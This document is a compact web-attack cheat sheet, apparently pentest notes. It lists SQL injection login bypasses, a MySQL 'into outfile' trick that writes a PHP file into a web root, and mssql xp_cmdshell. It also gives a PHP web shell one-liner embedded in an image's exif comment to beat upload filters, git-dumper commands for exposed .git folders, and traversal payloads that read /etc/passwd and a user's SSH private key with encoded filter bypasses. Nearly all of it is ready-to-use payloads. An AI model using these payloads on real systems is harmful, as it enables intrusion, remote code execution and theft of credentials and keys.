# SQLI
- Try admin'# (valid username, see netsparker sqli cheatsheet)
- Try abcd' or 1=1;--
- Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors
#### For mssql,
- xp_cmdshell
- Use concat for listing 2 or more column data in one
#### For mysql,
- try a' or 1='1 -- -
- A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'


# File Upload:
- Change mime type
- Add image headers
- Add payload in exiftool comment and name file as file.php.png
- ExifTool 
    - 1. <?php system($_GET['cmd']); ?> //shell.php 
    - 2. exiftool "-comment<=shell.php" malicious.png 
    - 3. strings malicious.png | grep system

# Git
#### 1. Download .git directory:
```bash
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
```
#### 2. Extract .git content:
```bash
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
```


# LFI & RFI 

### cheat sheet
```bash
../../../../etc/passwd

```
### Example to read SSH key:
- By default, SSH searches for `id_rsa`, `id_ecdsa`, `id_ecdsa_sk`, `id_ed25519`, `id_ed25519_sk`, and `id_dsa`
- Use URL encoding (%2e%2e%2f for ../) to bypass simple filters.
```bash
curl http://target/index.php?page=../../../../home/user/.ssh/id_rsa

#Encoded
http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
